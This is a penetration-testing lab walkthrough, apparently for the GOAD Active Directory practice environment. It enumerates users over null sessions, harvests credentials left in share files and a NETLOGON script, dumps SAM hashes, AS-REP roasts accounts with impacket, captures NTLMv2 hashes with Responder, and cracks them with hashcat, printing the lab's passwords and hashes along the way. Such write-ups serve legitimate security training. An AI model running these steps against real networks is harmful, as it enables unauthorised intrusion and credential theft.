
## User Enumeration


### Samwell Tarly

Samuel's Tarly's credentials were first to be discovered.  Initially rpcclient was used to enumerate users.
#### rpcclient

```bash
rpcclient -U "" //<IP_ADDRESS>
```

`enum` commands can be discovered by typing enum and pressing TAB on the keyboard

```ruby
┌──(qdada㉿GOAD-kali)-[~]
└─$ rpcclient -U "" --no-pass 192.168.56.11
rpcclient $> enum [TAB]
enumalsgroups              enumkey
enumdata                   enummonitors
enumdataex                 enumpermachineconnections
enumdomains                enumports
enumdomgroups              enumprinters
enumdomusers               enumprivs
enumdrivers                enumprocdatatypes
enumforms                  enumprocs
enumjobs                   enumtrust
rpcclient $>
```

the command we are looking for is `enumdomusers`

```ruby
┌──(qdada㉿GOAD-kali)-[~]
└─$ rpcclient -U "" --no-pass 192.168.56.11
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]
rpcclient $>
```

domain groups are enumerated in a similar way

```bash
rpcclient $> enumdomgroups
```

<div align="center" ><img width='65%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/02-enumdomaingroups.png'><br><ins>Enumerating Domain Groups</ins></div>



#### enum4linux

This command is most effective in that in one command reveals users, groups as well as important information in the description column of the ADUC ( [Active Directory Users and Computers](https://learn.microsoft.com/en-us/answers/questions/430532/active-directory-users-and-computers) ). On this host, a password is leaked for the user **samwell.tally**.


<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/03-Active-Directory-Users-and-Computers.png'><br><ins>Password leakage on ADUC</ins></div>

```bash
enum4linux -U 192.168.56.11
```

<div align="center" ><img width='95%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/04-enum4linux.png'><br><ins>Enum4linix enumeration</ins></div>

A more elaborate command that lists group membership in a single command but it lacks the DESCRIPTION field information.

```bash
enum4linux -a -r -K 5000 192.168.56.11
```
##### Netexec

Netexec can be used to perform null session enumeration. If you have it installed, the command is

```ruby
nxc smb 192.168.56.11 --users
```

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/05-netexec-anonymous-user-enumeration.png'><br><ins>Netexec user enumeration</ins></div>
Samwell Tarly's creds are
```
samwell.tarly : Heartsbane
```

It is important to enumerate the password policy should a password spray be required. This is done so as not to go over the password attempt threshold which is usually very low (5 attempts). Avoid brute force if possible, rather crack hashes

nxc smb 192.168.56.0/24 -u samwell.tarly -p Heartsbane --pass-pol

### Arya Stark

Using credentials discovered from null session enumeration that revealed sensitive information disclosure where credentials were left in the open.

```bash
#obtained by 
nxc smb 192.168.56.0/24 -u 'samwell.tarly' -p 'Heartsbane' -M spider_plus

#that command  produced the following
┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus]
└─$ ls -al
total 40
drwxr-xr-x  2 qdada qdada  4096 May  8 14:27 .
drwxrwxrwt 16 root  root  12288 May  8 14:26 ..
-rw-r--r--  1 qdada qdada  3345 May  8 14:27 192.168.56.11.json
-rw-r--r--  1 qdada qdada   250 May  8 14:27 192.168.56.22.json
-rw-r--r--  1 qdada qdada    17 May  8 14:27 192.168.56.23.json
-rw-r--r--  1 qdada qdada  9569 May  8 14:27 initial_spider_plus.txt
```

typing **`cat 192.168.56.22.json`** produced

```ruby
┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus]
└─$ cat 192.168.56.22.json |jq
{
  "all": {
    "arya.txt": {
      "atime_epoch": "2024-05-04 10:06:27",
      "ctime_epoch": "2024-05-04 10:06:27",
      "mtime_epoch": "2024-05-04 10:06:39",
      "size": "413 B"
    }
  },
  "public": {}
}
```

That suggests the `all` share has the file **`arya.txt`**

Downloading shared files is achieved through

```ruby
nxc smb 192.168.56.0/24 -u 'samwell.tarly' -p 'Heartsbane' -M spider_plus -o DOWNLOAD_FLAG=True
```

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/06-netexec-download.png'><br><ins>Downloading results of spider command</ins></div>

typing `cat /tmp/nxc_spider_plus/192.168.56.22.json` produced

```json
{
  "all": {
    "arya.txt": {
      "atime_epoch": "2024-05-04 10:06:27",
      "ctime_epoch": "2024-05-04 10:06:27",
      "mtime_epoch": "2024-05-04 10:06:39",
      "size": "413 B"
    }
  },
  "public": {}
}
```

This suggests a text file called arya.txt exists under the "all" share.

typing `cat /tmp/nxc_spider_plus/192.168.56.22/all/arya.txt` produced

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/07-arya-password.png'><br><ins>Displaying arya.txt</ins></div>

The association with Arya and Needle cannot be overlooked when one is familiar with the show. It is not a leap to think that Needle may be the password. Netexec is run again to verify

```bash
nxc smb 192.168.56.0/24 -u 'arya.stark' -p 'Needle'
```


<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/08-arya-password-confirmation.png'><br><ins>Password Confirmed</ins></div>
### Jeor Mormont

What can this Arya account access ? We run nxc once more ...

```bash
nxc smb 192.168.56.11,22-23 -u 'arya.stark' -p 'Needle' -M spider_plus -o DOWNLOAD_FLAG=True
```

That command downloads files including `NETLOGON/script.ps1`

```powershell
┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus/192.168.56.11/NETLOGON]
└─$ cat script.ps1
# fake script in netlogon with creds
$task = '/c TODO'
$taskName = "fake task"
$user = "NORTH\jeor.mormont"
$password = "_L0ngCl@w_"
```
### Brandon Stark

Having found Jeor Mormont's creds, ence again the credentials are tested over again ...

```bash
nxc smb 192.168.56.0/24 -u 'NORTH\jeor.mormont' -p '_L0ngCl@w_'
```

It is discovered that Jeor Mormont has Administrator access on `CASTLEBLACK`, obviously.

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/09-Jeor-Mormont.png'><br><ins>Jeor Mormont</ins></div>

```
nxc smb 192.168.56.22 -u 'jeor.mormont' -p '_L0ngCl@w_' --sam
```

```r
SMB         192.168.56.22   445    CASTELBLACK      [*] Dumping SAM hashes
SMB         192.168.56.22   445    CASTELBLACK      Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
SMB         192.168.56.22   445    CASTELBLACK      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.22   445    CASTELBLACK      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.22   445    CASTELBLACK      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4363b6dc0c95588964884d7e1dfea1f7:::
SMB         192.168.56.22   445    CASTELBLACK      vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
```


```
nxc smb 192.168.56.22 -u 'jeor.mormont' -p '_L0ngCl@w_' --loggedon-users
```

```r
 nxc smb 192.168.56.22 -u 'jeor.mormont' -p '_L0ngCl@w_' --loggedon-users
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\jeor.mormont:_L0ngCl@w_ (Pwn3d!)
SMB         192.168.56.22   445    CASTELBLACK      [+] Enumerated logged_on users
SMB         192.168.56.22   445    CASTELBLACK      NORTH\CASTELBLACK$        logon_server:
SMB         192.168.56.22   445    CASTELBLACK      CASTELBLACK\vagrant       logon_server: CASTELBLACK
SMB         192.168.56.22   445    CASTELBLACK      NORTH\sql_svc             logon_server: WINTERFELL
SMB         192.168.56.22   445    CASTELBLACK      NORTH\robb.stark          logon_server: WINTERFELL

```


##### AS-REPRoasting

##### a. impacket-GetNPUsers

The impacket command looks as follows

```r
impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -no-pass -usersfile users.txt
```

It means what is required are 
- domains  
- domain controller IPs  
- A list of users.

The 3 domains and their respective IP addresses are
```r
sevenkingdoms.local
	domain controller IP is 192.168.56.10
north.sevenkingdoms.local
	domain controller IP is 192.168.56.11
essos.local
	domain controller IP is 192.168.56.12
```

Since the `jeor.mormont` account can log onto all 5 hosts...

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/10-Jeor-Mormont-can-logon-to-all.png'><br><ins>Jeor Mormont can log on to all 5 hosts</ins></div>

Then, the account is used to dump usernames to users.txt

```bash
nxc smb 192.168.56.0/24 -u 'NORTH\jeor.mormont' -p '_L0ngCl@w_' --users | tee users.txt
```

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/11-users-list-5th-column.png'><br><ins>List of users</ins></div>

extracting the 5th column
```bash
awk '{print $5}' users.txt | sort | uniq | tee users2.tx
```

The impacket command can now be run, we need to cycle through each dc-ip and domain pair

```bash

impacket-GetNPUsers -dc-ip 192.168.56.10 'sevenkingdoms.local/' -no-pass -usersfile users2.txt

impacket-GetNPUsers -dc-ip 192.168.56.11 'north.sevenkingdoms.local/' -no-pass -usersfile users2.txt

impacket-GetNPUsers -dc-ip 192.168.56.12 'essos.local/' -no-pass -usersfile users2.txt

```


 It is observed that the second command has dumped the hash for us. 

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/12-reproast-hashes.png'><br><ins>The hash is dumped</ins></div>


The hash is copied to the file `brandon.stark.hash`

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/13-saving-hash-to-file.png'><br><ins>Saving the hash to file</ins></div>

On my machine hashcat on Kali was on a slow VM.
The hash is cracked on a windows system with as follows

```ruby
hashcat.exe -m 18200 hashes\brandon.stark.hash wordlist\rockyou.txt
```

```Ruby
qdada\:>hashcat.exe -m 18200 hashes\brandon.stark.hash wordlist\rockyou.txt
```

The hash is cracked

```powershell
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:240f046c623f1713579bd96fb41d2250$10a288fcd64c73ecaf0ce7b2209bec1e37cd7567d7e64e98cdfe9927c1123582ca49ea21530a9538d31d1a940d55879a5a5332298395878e410fbe38ed94ebf9e19bf8edd42bdc4a5a0047adf1150fb9554c4c4c02039bf35f6bf7ff4ad1cda780de57caaa809689da6c58218b0daa7293d12c9e004e2cda8e00cd79d8390e0462c3263c753b1be432ca55f0f43a132f428d4103fe73041f540f4b3a95b104354c7fd15d5e2987f9cf9d0ab30bc127760c52143900178708a29d6b16fb87d43735196ec04f2eead7d53f993bedc87f3b8f00b7581e0b661e6d4b35cf3a5183a413e1f1ebc379f7603be0098d5b5ab3a594486637cf2bea0e6f3776fc4601a84b0b882af1cbba:iseedeadpeople

```

The creds are `brandon.stark : iseedeadpeople`



### Robb Stark

Responder was run

```bash
 sudo python3 /usr/share/responder/Responder.py -I eth1 -dvw
```

The NTLMv2 has was captured and saved to file

```r
robb.stark::NORTH:f893c2290cdf77be:C3E8E3ABCB021D202C20A83A88630F73:010100000000000000C3F9F893A7DA0182762A8C3BF60CED0000000002000800330049004400480001001E00570049004E002D0034005300480033004E0042003500310036004B00350004003400570049004E002D0034005300480033004E0042003500310036004B0035002E0033004900440048002E004C004F00430041004C000300140033004900440048002E004C004F00430041004C000500140033004900440048002E004C004F00430041004C000700080000C3F9F893A7DA0106000400020000000800300030000000000000000000000000300000B0D3EDBD753E39790A0E1E0FCC32BB67CEB59F3E5543964647998CA99514FFB50A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000vw
```

The hash was cracked using hashcat...

```bash
hashcat.exe -a 0 -m 5600 hashes\robb.stark.hash wordlist\rockyou.txt
```

<div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/14-Robb-Stark-cracked.png'><br><ins>Robb's hash cracked</ins></div>
